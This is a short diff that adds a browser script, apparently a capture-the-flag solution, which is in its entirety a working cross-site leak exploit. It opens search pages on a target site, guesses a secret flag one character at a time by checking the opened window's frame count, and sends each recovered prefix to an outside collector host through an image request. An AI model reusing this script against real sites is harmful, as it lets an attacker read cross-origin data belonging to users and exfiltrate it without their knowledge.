@@ -1,0 +1,41 @@
+<script>
+const BASE = "https://wonder.cbd2026.cloud";
+const EXFIL = "https://hg16svins35fd2gs8n8jd4o8rzxqlg95.oastify.com";
+
+const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
+
+async function test(prefix) {
+    let w = open(BASE + "/search?q=" + encodeURIComponent(prefix));
+    await new Promise(r => setTimeout(r, 1800));
+
+    let ok = false;
+    try {
+        ok = w.length > 0;
+    } catch(e) {}
+
+    w.close();
+    return ok;
+}
+
+async function run() {
+    let flag = "CBD{";
+
+    while (true) {
+        for (let c of charset) {
+            let guess = flag + c;
+
+            if (await test(guess)) {
+                flag += c;
+
+                // exfil (super reliable)
+                new Image().src = EXFIL + "/?f=" + encodeURIComponent(flag);
+
+                if (c === "}") return;
+                break;
+            }
+        }
+    }
+}
+
+run();
+</script>
